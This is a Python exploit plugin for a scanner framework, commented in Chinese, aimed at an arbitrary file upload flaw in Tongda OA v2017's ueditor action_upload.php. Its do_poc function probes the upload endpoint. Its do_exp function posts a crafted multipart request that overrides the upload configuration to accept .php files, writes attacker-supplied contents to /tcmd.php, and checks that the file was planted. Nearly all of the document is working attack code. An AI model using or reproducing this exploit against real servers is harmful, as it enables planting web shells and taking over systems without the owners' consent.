# -*- coding: UTF-8 -*-
#!/usr/bin/python
import requests
import time
def vuln_info():
    info={
        'vuln_name': '通达OA v2017 action_upload.php 任意文件上传漏洞',  #漏洞名称
        'vuln_referer':'未知',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'test',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''漏洞描述''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_class':'漏洞分类',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''修复建议。''',
        'FofaQuery_type':'socket', #socket、httpx
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="百度"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        # 返回参数
        #Result返回是否存在，
        #Result_Info为返回的信息，可以为Paylaod
        #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"payload"}
        status = requests.get(url + '/module/ueditor/php/action_upload.php?action=uploadfile',headers=heads,timeout=10,verify=False)
        if status.status_code == 200:
            result['Result'] =True
            result['Result_Info'] = '/module/ueditor/php/action_upload.php?action=uploadfile'
        print(result)
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')


def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        result = {"Result":False,"Result_Info":"payload"}
        if exp_data['type']=='uploadfile':
            data = {
                'CONFIG[fileFieldName]': 'ffff',
                'CONFIG[fileMaxSize]': '1000000000',
                'CONFIG[filePathFormat]': 'tcmd',
                'CONFIG[fileAllowFiles][]': '.php',
                'mufile': 'submit'
            }
            file = {
                'ffff': ('test.php', exp_data['filename_contents'], 'application/octet-stream')
            }
            requests.post(url + '/module/ueditor/php/action_upload.php?action=uploadfile', files=file,data=data,headers=heads, timeout=10, verify=False)
            getfile = requests.get(url + '/tcmd.php', headers=heads, timeout=10, verify=False)
            if getfile.status_code == 200:
                result['Result'] = True
                result['Result_Info'] = '上传成功\n上传路径为:'+url+'/tcmd.php'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')



